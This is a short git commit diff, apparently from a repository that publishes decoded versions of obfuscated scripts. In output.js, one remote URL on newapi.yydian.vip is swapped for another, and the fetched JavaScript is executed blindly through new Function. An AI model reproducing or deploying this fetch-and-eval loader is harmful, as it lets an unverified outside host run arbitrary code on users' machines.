5e25f4f44f59ac477a7bcde6153eb0638bef36fb
action <action@github.com>
2025-05-14 14:08:32 +0000

    Add decoded output file

--- output.js
+++ output.js
@@ -1,10 +1,10 @@
 
-fetch("https://newapi.yydian.vip/weidao/new/dmj/js/chunk-vendors.js").then(_0x5ef080 => {
-  if (!_0x5ef080.ok) throw new Error("请检查网络是否OK");
-  return _0x5ef080.text();
-}).then(_0x5549d7 => {
-  const _0x1c5abc = new Function(_0x5549d7);
-  _0x1c5abc();
-}).catch(_0x13c050 => {
+fetch("https://newapi.yydian.vip/weidao/new/dmj/js/content.js").then(_0x3507a9 => {
+  if (!_0x3507a9.ok) throw new Error("请检查网络是否OK");
+  return _0x3507a9.text();
+}).then(_0x41674e => {
+  const _0xf3a37c = new Function(_0x41674e);
+  _0xf3a37c();
+}).catch(_0x5864e0 => {
   reject();
 });
